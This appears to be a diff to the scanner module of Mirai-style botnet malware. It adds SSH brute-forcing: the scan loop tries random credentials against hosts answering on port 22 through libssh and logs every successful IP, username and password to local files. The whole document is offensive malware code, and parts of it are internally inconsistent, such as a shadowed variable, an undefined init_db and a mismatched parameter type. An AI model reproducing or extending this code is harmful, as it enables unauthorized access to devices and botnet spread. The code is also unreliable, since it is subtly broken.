@@ -18,6 +18,8 @@
 #include <string.h>
 #include <linux/ip.h>
 #include <linux/tcp.h>
+#include <libssh/libssh.h>
+#include <mysql/mysql.h>
 
 #include "includes.h"
 #include "scanner.h"
@@ -71,6 +73,9 @@ void scanner_init(void)
     rand_init();
     fake_time = time(NULL);
     conn_table = calloc(SCANNER_MAX_CONNS, sizeof(struct scanner_connection));
+
+    MYSQL *conn = init_db(); // Initialize database connection
+
     for (i = 0; i < SCANNER_MAX_CONNS; i++)
     {
         conn_table[i].state = SC_CLOSED;
@@ -271,6 +276,18 @@ void scanner_init(void)
                 continue;
             if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                 continue;
+
+            if (tcph->source == htons(22))
+            { // SSH port
+                char ip_string[INET_ADDRSTRLEN];
+                inet_ntop(AF_INET, &(iph->saddr), ip_string, INET_ADDRSTRLEN);
+                struct scanner_auth *auth_attempt = random_auth_entry(); // Get random credentials to try
+                if (try_ssh_connection(ip_string, auth_attempt->username, auth_attempt->password) == 1)
+                {
+                    store_auth_details(conn, ip_string, 22, auth_attempt->username, auth_attempt->password);
+                    report_working(iph->saddr, ntohs(tcph->source), auth_attempt);
+                }
+            }
 
             conn = NULL;
             for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
@@ -645,6 +662,55 @@ void scanner_kill(void)
     kill(scanner_pid, 9);
 }
 
+void store_auth_details(struct scanner_connection *conn, char *ip, int port, char *username, char *password) {
+    FILE *fp = fopen("successful_auths.txt", "a"); // Open the file in append mode
+    if (fp != NULL) {
+        fprintf(fp, "Success: IP: %s, Port: %d, Username: %s, Password: %s\n", ip, port, username, password);
+        fclose(fp); // Always close file descriptor
+    } else {
+        perror("File open failed");
+    }
+}
+
+void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth) {
+    FILE *fp = fopen("report_working.txt", "a");
+    if (fp != NULL) {
+        fprintf(fp, "Report: Device at IP %d Port %d with Username: %s and Password: %s confirmed.\n",
+                ntohl(daddr), dport, auth->username, auth->password);
+        fclose(fp);
+    } else {
+        perror("File open failed");
+    }
+}
+
+int try_ssh_connection(char *ip, char *username, char *password) {
+    ssh_session my_ssh_session;
+    int rc;
+    my_ssh_session = ssh_new();
+    if (my_ssh_session == NULL)
+        return 0;
+
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, ip);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);
+
+    rc = ssh_connect(my_ssh_session);
+    if (rc != SSH_OK) {
+        ssh_free(my_ssh_session);
+        return 0;
+    }
+
+    rc = ssh_userauth_password(my_ssh_session, NULL, password);
+    if (rc == SSH_AUTH_SUCCESS) {
+        ssh_disconnect(my_ssh_session);
+        ssh_free(my_ssh_session);
+        return 1; // Success
+    }
+
+    ssh_disconnect(my_ssh_session);
+    ssh_free(my_ssh_session);
+    return 0; // Fail
+}
+
 static void setup_connection(struct scanner_connection *conn)
 {
     struct sockaddr_in addr = {0};
@@ -678,7 +744,7 @@ static uint8_t device = 1;
 static ipv4_t get_random_ip(void)
 {
     uint32_t tmp;
-    uint8_t o1 = 192, o2 = 168, o3 = 0, o4 = (device++)%255;
+    uint8_t o1 = 192, o2 = 168, o3 = 0, o4 = (device++) % 255;
 
     /*
     do
